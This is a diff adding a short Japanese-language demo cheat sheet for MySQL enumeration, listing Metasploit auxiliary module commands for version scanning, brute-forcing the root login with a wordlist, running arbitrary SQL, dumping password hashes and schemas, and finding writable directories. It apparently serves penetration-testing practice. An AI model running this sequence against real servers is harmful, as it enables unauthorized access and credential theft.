@@ -1,0 +1,54 @@
+demo:MySQL 列挙
+1) pingでターゲットホストが稼働しているかを確認する
+2) nmapでセキュリティホールをポートスキャンする
+3) service postgresql start && msfconsoleを起動する
+4) 以下のモジュールでバージョンを確認する
+use auxiliary/scanner/mysql/mysql_version
+set RHOSTS
+run
+5) 以下のモジュールで loginのクレデンシャルを得るために、ブルートフォースを行う
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+6) 以下のモジュールで、mysqlの情報を列挙する
+use auxiliary/admin/mysql/mysql_enum
+set USERNAME
+set PASSWORD
+set RHOSTS
+run
+7) 以下のモジュールで、ターゲットのMySQLデータベースに接続し、認証が成功した後で任意のSQLクエリを実行する
+use auxiliary/admin/mysql/mysql_sql
+set USERNAME
+set PASSWORD
+set RHOSTS
+run
+8) 以下のコマンドで、mysqlのファイルが存在するかどうかを列挙する
+use auxiliary/scanner/mysql/mysql_file_enum
+set USERNAME
+set PASSWORD
+set RHOSTS
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set VERBOSE true
+run
+9) 以下のモジュールで、ハッシュ値を確認する
+use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME
+set PASSWORD
+set RHOST
+run
+10) 以下のモジュールで、スキーマハッシュダンプを確認する
+use auxiliary/scanner/mysql/mysql_schemadump
+set USERNAME
+set PASSWORD
+set RHOSTS
+run
+11) 以下のモジュールで、データファイルの書き込みが可能なディレクトリをスキャンする時に使う。
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS
+set USERNANE
+set PASSWORD
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
